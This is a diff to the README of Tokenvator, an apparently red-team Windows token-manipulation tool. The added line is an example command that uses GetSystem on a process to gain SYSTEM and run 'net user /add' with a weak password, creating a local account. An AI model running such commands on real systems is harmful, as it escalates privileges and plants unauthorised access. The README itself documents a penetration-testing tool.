@@ -10,6 +10,8 @@ https://github.com/0xbadjuju/Tokenvator/wiki/Building-Tokenvator
 This project now utilizes [MonkeyWorks](https://github.com/NetSPI/MonkeyWorks), to clone issue the following command:<br>
 **git clone _--recursive_ https://github.com/0xbadjuju/Tokenvator.git**
 
+`Tokenvator.exe GetSystem /Process:3016 /command:'cmd.exe /c net user /add testuser Password1'`
+
 ### Author, Contributors, and License
 
 Author: Alexander Polce Leary (@0xbadjuju), NetSPI - 2018
